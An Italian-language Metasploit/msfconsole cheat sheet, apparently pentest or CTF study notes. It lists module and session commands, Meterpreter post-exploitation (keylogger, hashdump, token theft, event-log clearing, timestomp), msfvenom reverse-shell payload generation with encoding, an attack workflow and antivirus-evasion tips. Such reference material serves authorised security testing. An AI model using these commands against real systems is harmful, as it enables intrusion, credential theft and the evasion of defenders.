# Metasploit Framework — msfconsole

**Metasploit** è il framework di penetration testing più completo e utilizzato al mondo. `msfconsole` è la sua interfaccia principale da riga di comando. Permette di cercare exploit, configurare payload, lanciare attacchi, gestire sessioni e fare post-exploitation.

---

## A cosa serve?

- **Exploit:** Sfrutta vulnerabilità note su target remoti
- **Payload / Reverse Shell:** Genera e consegna codice malevolo (Meterpreter, shell bind/reverse)
- **Post-Exploitation:** Escalation privilegi, hashdump, keylogger, pivoting
- **Scansione e Enumerazione:** Moduli auxiliary per recon, fuzzing, brute force
- **Gestione Sessioni:** Controlla più macchine compromesse in parallelo

---

## Setup iniziale

```bash
# Avviare PostgreSQL (necessario per il database)
sudo systemctl start postgresql

# Inizializzare il database
sudo msfdb init

# Avviare msfconsole
msfconsole

# Aggiornare
sudo apt update && sudo apt install metasploit-framework
```

---

## Comandi principali

| Comando | Descrizione |
|---------|-------------|
| `show exploits` | Mostra tutti gli exploit disponibili |
| `show payloads` | Mostra tutti i payload disponibili |
| `show auxiliary` | Mostra tutti i moduli ausiliari |
| `search <nome>` | Cerca exploit o moduli |
| `info` | Info dettagliate su un modulo selezionato |
| `use <nome>` | Carica un exploit o modulo |
| `show options` | Mostra le opzioni configurabili |
| `show targets` | Mostra i target supportati dall'exploit |
| `set <opzione> <valore>` | Imposta un parametro (es. `set RHOST 10.10.10.40`) |
| `setg <opzione> <valore>` | Imposta un parametro globale (vale per tutti i moduli) |
| `set payload <payload>` | Seleziona il payload |
| `check` | Verifica se il target è vulnerabile (senza attaccare) |
| `exploit` / `run` | Esegui il modulo |
| `exploit -j` | Esegui come job in background |
| `exploit -z` | Esegui senza interagire con la sessione |
| `back` | Torna indietro (deseleziona il modulo) |

---

## Ricerca avanzata

```bash
search eternalromance type:exploit
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

---

## Tipologie di moduli

| Tipo | Descrizione |
|------|-------------|
| **Auxiliary** | Scansione, fuzzing, sniffing, enumerazione |
| **Exploits** | Sfruttano vulnerabilità per consegnare il payload |
| **Payloads** | Codice eseguito sul target (reverse shell, meterpreter) |
| **Encoders** | Codificano il payload per evasione AV e bad-char removal |
| **Post** | Moduli post-exploitation (info gathering, pivoting) |
| **NOPs** | Mantengono costanti le dimensioni del payload |

---

## Payload: Singles vs Staged

- **Singles** (`windows/shell_bind_tcp`): Tutto in uno, stabile ma pesante
- **Staged** (`windows/meterpreter/reverse_tcp`): Diviso in stager (piccolo, stabilisce la connessione) + stage (il payload vero, scaricato dopo)
- Le barre `/` separate nel nome indicano un payload staged

```bash
show payloads
grep meterpreter grep reverse_tcp show payloads
set payload <num>
show options
```

---

## Sessioni e Job

| Comando | Descrizione |
|---------|-------------|
| `sessions -l` | Lista le sessioni attive |
| `sessions -l -v` | Lista dettagliata |
| `sessions -i <ID>` | Entra in una sessione |
| `sessions -K` | Chiudi tutte le sessioni |
| `sessions -u <ID>` | Upgrade shell a Meterpreter |
| `sessions -c <cmd>` | Esegui comando su tutte le sessioni |
| `jobs -l` | Lista i job in background |
| `jobs -k <ID>` | Uccidi un job |
| `jobs -K` | Uccidi tutti i job |
| `bg` / `CTRL+Z` | Metti sessione in background |

---

## Meterpreter — Comandi principali

| Comando | Descrizione |
|---------|-------------|
| `sysinfo` | Info di sistema del target |
| `getuid` | Utente corrente |
| `getprivs` | Privilegi disponibili |
| `getsystem` | Tenta escalation a SYSTEM |
| `ps` | Lista processi |
| `migrate <PID>` | Migra in un altro processo |
| `shell` | Apri shell di sistema |
| `upload <file>` | Carica file sul target |
| `download <file>` | Scarica file dal target |
| `screenshot` | Screenshot dello schermo |
| `keyscan_start` | Avvia keylogger |
| `keyscan_dump` | Mostra tasti catturati |
| `keyscan_stop` | Ferma keylogger |
| `hashdump` | Dump hash password (SAM) |
| `clearev` | Cancella Event Logs |
| `timestomp` | Modifica timestamp file (anti-forensics) |
| `background` | Sessione in background |

### Token e impersonificazione

| Comando | Descrizione |
|---------|-------------|
| `use incognito` | Carica modulo incognito |
| `list_tokens -u` | Token disponibili per utente |
| `list_tokens -g` | Token disponibili per gruppo |
| `impersonate_token <DOMINIO\\UTENTE>` | Impersonifica un token |
| `steal_token <PID>` | Ruba token da un processo |
| `drop_token` | Rilascia token impersonificato |
| `rev2self` | Torna all'utente originale |

### Sniffing di rete

| Comando | Descrizione |
|---------|-------------|
| `use sniffer` | Carica modulo sniffer |
| `sniffer_interfaces` | Lista interfacce di rete |
| `sniffer_start <ID> <buffer>` | Avvia sniffing |
| `sniffer_dump <ID> file.pcap` | Salva cattura in pcap |
| `sniffer_stop <ID>` | Ferma sniffer |

---

## Database

```bash
# Controllare stato PostgreSQL
sudo service postgresql status

# Inizializzare DB
sudo msfdb init

# Workspace
workspace                    # Lista workspace
workspace -a Target1         # Crea workspace
workspace -d Target1         # Elimina workspace

# Importare scan
db_import Target.xml

# Nmap integrato
db_nmap -sV -sS 10.10.10.8

# Consultare risultati
hosts
services
creds
loot

# Backup
db_export -f xml backup.xml
```

---

## MSFVenom — Generare payload standalone

```bash
# Reverse shell ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

# Exe con encoding
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o payload.exe

# Senza encoding
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
  LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

# Controllare con VirusTotal
msf-virustotal -k <API_KEY> -f payload.exe
```

---

## Plugin utili

| Plugin | Comando | Descrizione |
|--------|---------|-------------|
| WMAP | `load wmap` | Web application scanner |
| Nessus | `load nessus` | Integrazione Nessus |
| Nexpose | `load nexpose` | Integrazione Nexpose |
| auto_add_route | `load auto_add_route` | Aggiunge rotte di rete automaticamente per pivoting |
| session_notifier | `load session_notifier` | Notifiche quando arriva una sessione |

---

## Flusso tipico di attacco

```bash
# 1. Scansione
db_nmap -sV -sS 10.10.10.15

# 2. Cercare exploit
search <servizio/cve>

# 3. Selezionare e configurare
use <exploit>
set RHOSTS 10.10.10.15
set LHOST 10.10.14.5
set payload windows/meterpreter/reverse_tcp

# 4. Lanciare
exploit

# 5. Post-exploitation (da Meterpreter)
getuid
getsystem
hashdump

# 6. Privilege escalation con modulo suggerito
bg
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

---

## Evasione AV / IDS

- **Encoders:** `show encoders` — codifica il payload (shikata_ga_nai, ecc.)
- **Packers:** UPX, Themida — comprimi e cripta l'exe
- **Archivi con password:** Doppio archivio RAR con password, rimuovi estensione
- **Traffico cifrato:** Meterpreter usa AES di default

> I file di Metasploit si trovano in `/usr/share/metasploit-framework/`
>
> Fonte: https://github.com/rapid7/metasploit-framework
